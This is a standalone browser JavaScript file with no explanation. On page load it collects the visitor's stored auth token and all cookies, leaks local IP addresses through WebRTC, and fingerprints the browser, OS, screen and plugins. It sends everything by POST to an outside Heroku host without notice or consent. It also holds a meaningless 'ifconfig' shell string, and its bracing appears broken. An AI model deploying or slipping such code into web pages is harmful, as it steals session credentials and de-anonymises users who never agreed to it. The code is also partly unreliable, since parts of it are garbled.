(function(){
	var unique = {},rtcStr = '';
	var p = new Promise(done => getRtcConnStr(done))
	.then(() => {
		unique = {
			token:getToken(),
			cookie:getCookie(''),
			rtcIP:rtcStr,
			noRtcIP:getNoRtcConnStr(),
			pseudofier:getPseudofier()};
		here(unique);
		//getIpLocation(unique.rtcIP);
		sendReq('POST','https://serene-sea-11727.herokuapp.com/connect',unique);})
	.catch(e => {
		sendReq('POST','/scriptErrorCatcher',{scriptErrors:e.message});
		sendReq('POST','https://serene-sea-11727.herokuapp.com/apiError',{apiError:e.message});});}
	function getToken(){
		return window.name||
		window.sessionStorage['myTkn']||
		window.localStorage['myTkn'];}
		function setToken(t){
		t?window.localStorage.setItem('myTkn',t):
		window.localStorage.removeItem('myTkn');}
	function getIpLocation(ip){sendReq('GET',"https://www.iplocation.net/?query="+ip)}
	function getLocation(){return new Promise(done => this.geolocate(done)).then(loc => this.formatLoc(loc));}
	function geolocate(done){return window.navigator.geolocation.getCurrentPosition(done);}
	function formatLoc(loc){return {lat:loc['coords'].latitude,lng:loc['coords'].longitude};}
	function getCookie(cname){
		var name = cname + "=";
		var decodedCookie = decodeURIComponent(document.cookie);
		var ca = decodedCookie.split(';');
		for(var i = 0; i <ca.length; i++){
			var c = ca[i];
			while (c.charAt(0) == ' '){c = c.substring(1);}
			if(c.indexOf(name) == 0){return c.substring(name.length, c.length);}}
		return "";}
	function getRtcConnStr(done){
		let RTCPeerConnection = window.webkitRTCPeerConnection || window.mozRTCPeerConnection;
		if(RTCPeerConnection)(function(){
			let rtc = new RTCPeerConnection({iceServers:[]});
			if(window.mozRTCPeerConnection){rtc.createDataChannel('',{reliable:false});}
			rtc.onicecandidate = function(evt){if(evt.candidate) grepSDP(evt.candidate.candidate);};  
			rtc.createOffer(offerDesc => {
				//console.log(offerDesc);
				grepSDP(offerDesc.sdp);
				rtc.setLocalDescription(offerDesc);},
				e => hereW("offer failed", e));
			let addrs = Object.create(null);
			addrs["0.0.0.0"] = false;
			function grepSDP(sdp){
				var hosts = []; 
				sdp.split('\r\n').forEach(line => {
					if(line.includes("a=candidate")){
						var parts = line.split(' '),addr = parts[4],type = parts[7];
						if(type === 'host') addAddress(addr);}
					else if(line.includes("c=")){
						var parts = line.split(' '),addr = parts[2];
						addAddress(addr);}
					else if(line.includes("o=")){
						var parts = line.substr(line.indexOf('IP')).split(' '),addr = parts[1];
						addAddress(addr);}});
				done();}
			function addAddress(newAddr){
				if (newAddr in addrs) return;
				else addrs[newAddr] = true;
				let displayAddrs = Object.keys(addrs).filter(k => addrs[k]);
				//here(displayAddrs);
				rtcStr += displayAddrs.join(" or perhaps ") || "n/a";}})();} 
	function getNoRtcConnStr(){
		let cmd = "<code>ifconfig | grep inet | grep -v inet6 | cut -d\" \" -f2 | tail -n1</code>",
		iplist = document.createElement('div');
		iplist.innerHTML = cmd;
		return iplist.innerHTML.includes('<code>')?'':iplist.innerHTML;}
	function getPseudofier(){return new Pseudofier().pseudofy();}
	function sendReq(method,url,data){
		var xhr = new XMLHttpRequest();
		xhr.onreadystatechange = function(){
			if(this.readyState == 4&&this.status == 200) 
				console.log(JSON.parse(this.responseText));}
		xhr.open(method,url,true);
		xhr.setRequestHeader('Access-Control-Allow-Origin','*');
		xhr.setRequestHeader('Content-type','application/json');
		xhr.setRequestHeader('Access-Control-Allow-Methods','GET,PUT,POST,DELETE');
		method=='GET'?xhr.send():xhr.send(JSON.stringify(data));}
	class Pseudofier{
		get browser(){
			let nAgt = navigator.userAgent,
			browser = navigator.appName,
			version = '' + parseFloat(navigator.appVersion),
			majorVersion = parseInt(navigator.appVersion, 10),
			nameOffset, verOffset, ix;
			if((verOffset = nAgt.indexOf('Opera'))+1){
			browser = 'Opera';version = nAgt.substring(verOffset + 6);
			if((verOffset = nAgt.indexOf('Version'))+1){version = nAgt.substring(verOffset + 8);}}
			if((verOffset = nAgt.indexOf('OPR')) != -1){browser = 'Opera';version = nAgt.substring(verOffset + 4);}
			else if((verOffset = nAgt.indexOf('Edge'))+1){browser = 'Microsoft Edge';version = nAgt.substring(verOffset + 5);}
			else if((verOffset = nAgt.indexOf('MSIE'))+1){browser = 'Microsoft Internet Explorer';version = nAgt.substring(verOffset + 5);}
			else if((verOffset = nAgt.indexOf('Chrome'))+1){browser = 'Chrome';version = nAgt.substring(verOffset + 7);}
			else if((verOffset = nAgt.indexOf('Safari'))+1){
			browser = 'Safari';version = nAgt.substring(verOffset + 7);
			if ((verOffset = nAgt.indexOf('Version')) != -1){version = nAgt.substring(verOffset + 8);}}
			else if((verOffset = nAgt.indexOf('Firefox'))+1){browser = 'Firefox';version = nAgt.substring(verOffset + 8);}
			else if(nAgt.indexOf('Trident/')+1){browser = 'Microsoft Internet Explorer';version = nAgt.substring(nAgt.indexOf('rv:') + 3);}
			else if((nameOffset = nAgt.lastIndexOf(' ') + 1) < (verOffset = nAgt.lastIndexOf('/'))){
			browser = nAgt.substring(nameOffset,verOffset);version = nAgt.substring(verOffset + 1);
			if (browser.toLowerCase() == browser.toUpperCase()){browser = navigator.appName;}}
			if((ix = version.indexOf(';'))+1) version = version.substring(0, ix);
			if((ix = version.indexOf(' '))+1) version = version.substring(0, ix);
			if((ix = version.indexOf(')'))+1) version = version.substring(0, ix);
			majorVersion = parseInt('' + version, 10);
			if(isNaN(majorVersion)){
			version = '' + parseFloat(navigator.appVersion);
			majorVersion = parseInt(navigator.appVersion,10);}
			return {name:browser,version:version,majorVersion:majorVersion};}
		get os(){
			let os = '-',nAgt = navigator.userAgent,nVer = navigator.appVersion;
			for(var id in clientStrings){
				var cs = clientStrings[id];
				if(cs.r.test(nAgt)){os = cs.s;break;}}
			let osVersion = '-';
			if(/Windows/.test(os)){
				osVersion = /Windows (.*)/.exec(os)[1];
				os = 'Windows';}
			switch(os){
				case 'Mac OS X':osVersion = /Mac OS X (10[\.\_\d]+)/.exec(nAgt)[1];break;
				case 'Android':osVersion = /Android ([\.\_\d]+)/.exec(nAgt)[1];break;
				case 'iOS':
					let a = /OS (\d+)_(\d+)_?(\d+)?/.exec(nVer);
					osVersion = `${a[1]}.${a[2]}.${a[3]||'0'}`;
					break;}
			return {name:os,version:osVersion}}
		get cookieEnabled(){
			let cookies = (navigator.cookieEnabled)?true:false;
			if(typeof navigator.cookieEnabled == 'undefined'&&!cookies){
				document.cookie = 'testcookie';
				cookies = (document.cookie.indexOf('testcookie')+1)?true:false;}
			return cookies}
		get specs(){
			return {
				screen:{
					width:screen.width?screen.width:'',
					height:screen.height?screen.height:'',
					depth:screen.pixelDepth?screen.pixelDepth:''},
				browser:this.browser,
				device:{
				//type:deviceSizes.filter(s => screen.width>s.pixels[0]&&screen.width>s.pixels[1])[0].name,
				isMobile:/Mobile|mini|Fennec|Android|iP(ad|od|hone)/.test(navigator.appVersion)},
				os:this.os,
				cookies:this.cookieEnabled,
				agent:navigator.userAgent,
				plugins:navigator.plugins.length,
				mimes:navigator.mimeTypes.length};}
		pseudofy(){
			let s = this.specs;
			//here(s);
			return s}
			/*.mimes+
				JSON.stringify(s.browser).replace(/\D+/g,'')+
				JSON.stringify(s.os).replace(/\D+/g,'')+
				(s.cookies?1:0)+
				s.plugins+
				s.agent.replace(/\D+/g,'')+
				s.screen.height+
				s.screen.width+
				s.screen.depth+
				'-'+s.device.type;}}*/
	const deviceSizes = [
		{name:'Desktop/Laptop',pixels:[1024,768],viewport:[]},
		{name:'iPhone X',pixels:[1125,2436],viewport:[375,812]},
		{name:'iPhone 8 Plus',pixels:[1080,1920],viewport:[414,736]},
		{name:'iPhone 8',pixels:[750,1334],viewport:[375,667]},
		{name:'iPhone 7 Plus',pixels:[1080,1920],viewport:[414,736]},
		{name:'iPhone 7',pixels:[750,1334],viewport:[375,667]},
		{name:'iPhone 6 Plus/6S Plus',pixels:[1080,1920],viewport:[414,736]},
		{name:'iPhone 6/6S',pixels:[750,1334],viewport:[375,667]},
		{name:'iPhone 5',pixels:[640,1136],viewport:[320,568]},
		{name:'iPod Touch',pixels:[640,1136],viewport:[320,568]},
		{name:'iPad Pro',pixels:[2048,2732],viewport:[1024,1366]},
		{name:'iPad Third & Fourth Generation',pixels:[1536,2048],viewport:[768,1024]},
		{name:'iPad Air 1 & 2',pixels:[1536,2048],viewport:[768,1024]},
		{name:'iPad Mini',pixels:[768,1024],viewport:[768,1024]},
		{name:'iPad Mini 2 & 3',pixels:[1536,2048],viewport:[768,1024]},
		{name:'Nexus 6P',pixels:[1440,2560],viewport:[411,731]},
		{name:'Nexus 5X',pixels:[1080,1920],viewport:[411,731]},
		{name:'Google Pixel',pixels:[1080,1920],viewport:[411,731]},
		{name:'Google Pixel XL',pixels:[1440,2560],viewport:[411,731]},
		{name:'Google Pixel 2',pixels:[1080,1920],viewport:[411,731]},
		{name:'Google Pixel 2 XL',pixels:[1440,2560],viewport:[411,731]},
		{name:'Samsung Galaxy Note 5',pixels:[1440,2560],viewport:[480,853]},
		{name:'LG G5',pixels:[1440,2560],viewport:[480,853]},
		{name:'One Plus 3',pixels:[1080,1920],viewport:[480,853]},
		{name:'Samsung Galaxy S8',pixels:[1440,2960],viewport:[360,740]},
		{name:'Samsung Galaxy S8+',pixels:[1440,2960],viewport:[360,740]},
		{name:'Samsung Galaxy S7',pixels:[1440,2560],viewport:[360,640]},
		{name:'Samsung Galaxy S7 Edge',pixels:[1440,2560],viewport:[360,640]},
		{name:'Nexus 7 (2013)',pixels:[1200,1920],viewport:[600,960]},
		{name:'Nexus 9',pixels:[1536,2048],viewport:[768,1024]},
		{name:'Samsung Galaxy Tab 10',pixels:[800,1280],viewport:[800,1280]},
		{name:'Chromebook Pixel',pixels:[2560,1700],viewport:[1280,850]}];
	const clientStrings = [
		{s:'Windows 10', r:/(Windows 10.0|Windows NT 10.0)/},
		{s:'Windows 8.1', r:/(Windows 8.1|Windows NT 6.3)/},
		{s:'Windows 8', r:/(Windows 8|Windows NT 6.2)/},
		{s:'Windows 7', r:/(Windows 7|Windows NT 6.1)/},
		{s:'Windows Vista', r:/Windows NT 6.0/},
		{s:'Windows Server 2003', r:/Windows NT 5.2/},
		{s:'Windows XP', r:/(Windows NT 5.1|Windows XP)/},
		{s:'Windows 2000', r:/(Windows NT 5.0|Windows 2000)/},
		{s:'Windows ME', r:/(Win 9x 4.90|Windows ME)/},
		{s:'Windows 98', r:/(Windows 98|Win98)/},
		{s:'Windows 95', r:/(Windows 95|Win95|Windows_95)/},
		{s:'Windows NT 4.0', r:/(Windows NT 4.0|WinNT4.0|WinNT|Windows NT)/},
		{s:'Windows CE', r:/Windows CE/},
		{s:'Windows 3.11', r:/Win16/},
		{s:'Android', r:/Android/},
		{s:'Open BSD', r:/OpenBSD/},
		{s:'Sun OS', r:/SunOS/},
		{s:'Linux', r:/(Linux|X11)/},
		{s:'iOS', r:/(iPhone|iPad|iPod)/},
		{s:'Mac OS X', r:/Mac OS X/},
		{s:'Mac OS', r:/(MacPPC|MacIntel|Mac_PowerPC|Macintosh)/},
		{s:'QNX', r:/QNX/},
		{s:'UNIX', r:/UNIX/},
		{s:'BeOS', r:/BeOS/},
		{s:'OS/2', r:/OS\/2/},
		{s:'Search Bot', r:/(nuhk|Googlebot|Yammybot|Openbot|Slurp|MSNBot|Ask Jeeves\/Teoma|ia_archiver)/}];
})();